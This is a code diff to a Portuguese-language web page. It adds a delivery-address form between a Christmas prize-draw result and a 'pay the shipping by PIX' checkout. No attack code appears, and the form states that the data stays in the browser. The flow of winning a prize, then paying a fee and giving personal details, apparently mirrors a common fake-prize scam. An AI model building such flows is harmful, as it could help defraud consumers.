@@ -9,6 +9,8 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,600;9..144,800&family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="delivery.css">
+    <script src="delivery.js" defer></script>
     <style>
       :root {
         color-scheme: light;
@@ -323,7 +325,9 @@
       .welcome-button:focus-visible { outline: 3px solid var(--cream); outline-offset: 4px; }
 
       .result-card {
-        width: min(100%, 400px);
+        width: min(100%, 520px);
+        max-height: calc(100vh - 40px);
+        overflow-y: auto;
         padding: 34px 24px;
         border: 1px solid rgba(189, 139, 61, .65);
         border-radius: 24px;
@@ -469,13 +473,98 @@
       <div class="result-card">
         <p>🎄 Parabéns! 🎄</p>
         <h2 id="result-title"></h2>
-        <button id="checkout" class="checkout-button" type="button">PAGUE O FRETE por R$ 29,90 — gerar PIX</button>
-        <div id="payment-details" class="payment-details" hidden>
-          <p id="payment-status" class="payment-status" role="status" aria-live="polite"></p>
-          <img id="payment-qr" class="payment-qr" alt="QR Code PIX para pagamento" hidden>
-          <textarea id="pix-code" class="pix-code" aria-label="Código PIX copia e cola" readonly hidden></textarea>
-          <button id="copy-pix" class="copy-pix-button" type="button" hidden>Copiar código PIX</button>
-        </div>
+        <section id="delivery-step" class="delivery-step" aria-labelledby="delivery-title">
+          <h3 id="delivery-title">Dados para entrega</h3>
+          <p class="delivery-intro">Preencha os dados para avançar ao pagamento.</p>
+          <p class="delivery-privacy">
+            Os dados serão validados neste navegador, mas ainda não são enviados ou armazenados pelo site.
+          </p>
+          <form id="delivery-form" novalidate>
+            <div class="delivery-grid">
+              <div class="delivery-field delivery-field--full">
+                <label for="delivery-name">Nome completo</label>
+                <input id="delivery-name" name="fullName" autocomplete="name" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-phone">Telefone com DDD</label>
+                <input id="delivery-phone" name="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="(11) 99999-9999" maxlength="15" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-email">E-mail</label>
+                <input id="delivery-email" name="email" type="email" autocomplete="email" placeholder="voce@exemplo.com" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-postal-code">CEP</label>
+                <input id="delivery-postal-code" name="postalCode" inputmode="numeric" autocomplete="postal-code" placeholder="00000-000" maxlength="9" required>
+                <span id="delivery-postal-status" class="delivery-field-hint" role="status" aria-live="polite"></span>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-city">Cidade</label>
+                <input id="delivery-city" name="city" autocomplete="address-level2" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-state">Estado</label>
+                <select id="delivery-state" name="state" autocomplete="address-level1" required>
+                  <option value="">Selecione</option>
+                  <option value="AC">Acre</option>
+                  <option value="AL">Alagoas</option>
+                  <option value="AP">Amapá</option>
+                  <option value="AM">Amazonas</option>
+                  <option value="BA">Bahia</option>
+                  <option value="CE">Ceará</option>
+                  <option value="DF">Distrito Federal</option>
+                  <option value="ES">Espírito Santo</option>
+                  <option value="GO">Goiás</option>
+                  <option value="MA">Maranhão</option>
+                  <option value="MT">Mato Grosso</option>
+                  <option value="MS">Mato Grosso do Sul</option>
+                  <option value="MG">Minas Gerais</option>
+                  <option value="PA">Pará</option>
+                  <option value="PB">Paraíba</option>
+                  <option value="PR">Paraná</option>
+                  <option value="PE">Pernambuco</option>
+                  <option value="PI">Piauí</option>
+                  <option value="RJ">Rio de Janeiro</option>
+                  <option value="RN">Rio Grande do Norte</option>
+                  <option value="RS">Rio Grande do Sul</option>
+                  <option value="RO">Rondônia</option>
+                  <option value="RR">Roraima</option>
+                  <option value="SC">Santa Catarina</option>
+                  <option value="SP">São Paulo</option>
+                  <option value="SE">Sergipe</option>
+                  <option value="TO">Tocantins</option>
+                </select>
+              </div>
+              <div class="delivery-field delivery-field--full">
+                <label for="delivery-street">Rua e endereço completo</label>
+                <input id="delivery-street" name="street" autocomplete="street-address" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-number">Número do imóvel</label>
+                <input id="delivery-number" name="number" autocomplete="address-line2" required>
+              </div>
+              <div class="delivery-field">
+                <label for="delivery-complement">Complemento <span>(opcional)</span></label>
+                <input id="delivery-complement" name="complement" autocomplete="address-line3">
+              </div>
+            </div>
+            <p id="delivery-message" class="delivery-message" role="status" aria-live="polite" hidden></p>
+            <button class="delivery-submit" type="submit">Validar e continuar para o PIX</button>
+          </form>
+        </section>
+        <section id="checkout-step" class="checkout-step" aria-label="Pagamento PIX" hidden>
+          <p class="delivery-warning">
+            Os dados de entrega não foram enviados nem associados a esta cobrança. O servidor atual cria somente o PIX.
+          </p>
+          <button id="edit-delivery" class="edit-delivery-button" type="button">Voltar e editar os dados</button>
+          <button id="checkout" class="checkout-button" type="button">PAGUE O FRETE por R$ 29,90 — gerar PIX</button>
+          <div id="payment-details" class="payment-details" hidden>
+            <p id="payment-status" class="payment-status" role="status" aria-live="polite"></p>
+            <img id="payment-qr" class="payment-qr" alt="QR Code PIX para pagamento" hidden>
+            <textarea id="pix-code" class="pix-code" aria-label="Código PIX copia e cola" readonly hidden></textarea>
+            <button id="copy-pix" class="copy-pix-button" type="button" hidden>Copiar código PIX</button>
+          </div>
+        </section>
         <button id="close-result" class="close-button" type="button">Fechar</button>
       </div>
     </section>
@@ -515,6 +604,9 @@
       const result = document.querySelector("#result");
       const resultTitle = document.querySelector("#result-title");
       const closeResult = document.querySelector("#close-result");
+      const deliveryFormElement = document.querySelector("#delivery-form");
+      const deliveryStepElement = document.querySelector("#delivery-step");
+      const checkoutStepElement = document.querySelector("#checkout-step");
       const checkoutButton = document.querySelector("#checkout");
       const paymentDetails = document.querySelector("#payment-details");
       const paymentStatus = document.querySelector("#payment-status");
@@ -620,7 +712,9 @@
 
         window.setTimeout(() => {
           resultTitle.textContent = `Você ganhou: ${prizes[winningPrize].name}!`;
-          checkoutButton.hidden = false;
+          deliveryFormElement.reset();
+          deliveryStepElement.hidden = false;
+          checkoutStepElement.hidden = true;
           checkoutButton.disabled = false;
           checkoutButton.textContent = "PAGUE O FRETE por R$ 29,90 — gerar PIX";
           paymentDetails.hidden = true;
